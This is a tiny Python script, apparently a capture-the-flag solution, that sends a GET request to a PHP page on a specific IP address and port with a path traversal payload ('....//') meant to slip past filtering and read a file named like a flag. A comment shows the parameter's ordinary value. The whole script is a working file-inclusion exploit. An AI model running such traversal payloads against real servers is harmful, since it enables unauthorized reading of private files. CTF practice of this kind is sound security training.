import requests
url = "http://115.28.78.16:13333/6841a43503c4a909484566cdc2850fce/index.php?f=....//fl1l11l1ag.php"
re = requests.get(url)
print(re.text)
print(re.request.headers)
#http://115.28.78.16:13333/6841a43503c4a909484566cdc2850fce/index.php?f=explorer.jpg


